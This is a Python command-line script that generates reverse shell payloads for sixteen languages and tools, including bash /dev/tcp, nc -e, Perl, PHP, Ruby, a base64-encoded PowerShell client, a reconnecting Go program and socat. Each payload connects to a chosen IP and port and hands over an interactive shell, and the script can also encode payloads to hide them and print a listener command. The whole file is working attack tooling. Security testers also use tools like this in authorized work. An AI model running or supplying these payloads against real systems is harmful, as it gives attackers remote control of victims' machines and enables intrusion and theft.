#!/usr/bin/env python3

import argparse
import base64
import ipaddress
import os
import random
import string
import sys
import urllib.parse

class ReverseShellGenerator:
    def __init__(self):
        self.shells = {
            'bash': self._bash_shell,
            'bash_196': self._bash_196_shell,
            'perl': self._perl_shell,
            'python': self._python_shell,
            'python3': self._python3_shell,
            'php': self._php_shell,
            'ruby': self._ruby_shell,
            'netcat': self._netcat_shell,
            'ncat': self._ncat_shell,
            'powershell': self._powershell_shell,
            'awk': self._awk_shell,
            'java': self._java_shell,
            'javascript': self._javascript_shell,
            'telnet': self._telnet_shell,
            'golang': self._golang_shell,
            'socat': self._socat_shell,
        }
        
        self.encode_functions = {
            'base64': self._encode_base64,
            'hex': self._encode_hex,
            'url': self._encode_url,
            'none': lambda x: x,
        }

    def _bash_shell(self, ip, port):
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    
    def _bash_196_shell(self, ip, port):
        return f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196"
    
    def _perl_shell(self, ip, port):
        return f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    
    def _python_shell(self, ip, port):
        return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    
    def _python3_shell(self, ip, port):
        return f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    
    def _php_shell(self, ip, port):
        return f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    
    def _ruby_shell(self, ip, port):
        return f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    
    def _netcat_shell(self, ip, port):
        return f"nc -e /bin/sh {ip} {port}"
    
    def _ncat_shell(self, ip, port):
        return f"ncat {ip} {port} -e /bin/sh"
    
    def _powershell_shell(self, ip, port):
        ps_command = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        encoded_ps = base64.b64encode(ps_command.encode('utf16le')).decode()
        return f"powershell -e {encoded_ps}"
    
    def _awk_shell(self, ip, port):
        return f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'"
    
    def _java_shell(self, ip, port):
        return f"""
public class Shell {{
    public static void main(String[] args) {{
        try {{
            java.lang.Runtime r = java.lang.Runtime.getRuntime();
            Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
            p.waitFor();
        }} catch (Exception e) {{}}
    }}
}}
"""
    
    def _javascript_shell(self, ip, port):
        return f"""
(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({port}, "{ip}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();
"""
    
    def _telnet_shell(self, ip, port):
        return f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF"
    
    def _golang_shell(self, ip, port):
        return f"""
package main
import (
    "net"
    "os/exec"
    "time"
)
func main() {{
    for {{
        c, _ := net.Dial("tcp", "{ip}:{port}")
        cmd := exec.Command("/bin/sh")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run()
        time.Sleep(5 * time.Second)
    }}
}}
"""
    
    def _socat_shell(self, ip, port):
        return f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"
    
    def _encode_base64(self, shell_command):
        return base64.b64encode(shell_command.encode()).decode()
    
    def _encode_hex(self, shell_command):
        return shell_command.encode().hex()
    
    def _encode_url(self, shell_command):
        return urllib.parse.quote_plus(shell_command)

    def generate(self, shell_type, ip, port, encode_type='none', listener=False):
        if shell_type not in self.shells:
            available = ", ".join(sorted(self.shells.keys()))
            return f"Error: Shell type '{shell_type}' not found. Available types: {available}"
        
        if encode_type not in self.encode_functions:
            available = ", ".join(sorted(self.encode_functions.keys()))
            return f"Error: Encoding '{encode_type}' not found. Available encodings: {available}"
        
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            return f"Error: Invalid IP address: {ip}"
        
        try:
            port = int(port)
            if port < 1 or port > 65535:
                raise ValueError()
        except ValueError:
            return f"Error: Invalid port: {port}. Must be between 1-65535."
        
        shell_command = self.shells[shell_type](ip, port)
        
        if encode_type != 'none':
            raw_command = shell_command
            shell_command = self.encode_functions[encode_type](shell_command)
            result = f"# {shell_type} reverse shell ({encode_type} encoded)\n"
            result += f"# Original: {raw_command}\n"
            result += f"# Encoded: {shell_command}\n"
            
            if encode_type == 'base64':
                result += f"\n# Decode with:\n"
                result += f"# echo '{shell_command}' | base64 -d\n"
            elif encode_type == 'hex':
                result += f"\n# Decode with:\n"
                result += f"# echo '{shell_command}' | xxd -r -p\n"
            
            return result
        else:
            result = f"# {shell_type} reverse shell\n{shell_command}"
        
        if listener:
            result += f"\n\n# Start listener with:\n# nc -lvnp {port}"
        
        return result

    def list_shells(self):
        return sorted(self.shells.keys())
    
    def list_encodings(self):
        return sorted(self.encode_functions.keys())


def main():
    generator = ReverseShellGenerator()
    
    parser = argparse.ArgumentParser(description='Generate reverse shells for various environments')
    parser.add_argument('-l', '--list', action='store_true', help='List available shell types and encodings')
    parser.add_argument('-s', '--shell', help='Shell type to generate')
    parser.add_argument('-i', '--ip', help='IP address for the reverse shell')
    parser.add_argument('-p', '--port', help='Port for the reverse shell')
    parser.add_argument('-e', '--encode', default='none', help='Encoding method to use')
    parser.add_argument('--listener', action='store_true', help='Include listener command')
    
    args = parser.parse_args()
    
    if args.list:
        print("Available shell types:")
        for shell in generator.list_shells():
            print(f"  - {shell}")
        print("\nAvailable encodings:")
        for encoding in generator.list_encodings():
            print(f"  - {encoding}")
        return
    
    if not args.shell or not args.ip or not args.port:
        parser.print_help()
        return
    
    result = generator.generate(args.shell, args.ip, args.port, args.encode, args.listener)
    print(result)


if __name__ == "__main__":
    main() 